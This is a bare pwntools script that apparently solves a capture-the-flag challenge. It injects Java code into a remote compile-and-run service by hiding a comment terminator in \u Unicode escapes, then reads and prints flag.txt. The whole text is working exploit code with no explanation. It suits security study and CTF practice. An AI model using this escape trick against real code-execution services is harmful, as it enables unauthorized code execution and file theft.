from pwn import *
nc = remote('chal.amt.rs', 2103)

code = """
*/
class Main {
    public static void main(String... args) {
        try {
            System.out.println(java.nio.file.Files.readAllLines(java.nio.file.Paths.get("flag.txt")));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
/*
"""
injection = "/*" + ''.join(r'\u{:04X}'.format(ord(ele)) for ele in code) + "*/"
payload = injection + "\n--EOF--"
print(payload)
output = nc.recvuntil("--EOF--\n").decode()
nc.sendline(payload.encode())
nc.interactive()
